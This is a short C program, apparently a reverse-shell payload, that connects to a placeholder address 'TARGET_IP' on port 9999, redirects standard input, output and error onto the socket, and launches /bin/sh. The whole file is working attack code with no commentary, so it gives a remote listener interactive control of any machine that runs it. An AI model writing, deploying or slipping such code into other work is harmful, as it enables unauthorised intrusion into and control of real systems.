#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

int main() {
    int sock;
    struct sockaddr_in server;
    char *sh = "/bin/sh";

    sock = socket(AF_INET, SOCK_STREAM, 0);
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr("TARGET_IP");
    server.sin_port = htons(9999);

    connect(sock, (struct sockaddr *)&server, sizeof(server));
    dup2(sock, 0);
    dup2(sock, 1);
    dup2(sock, 2);
    execve(sh, NULL, NULL);

    return 0;
}
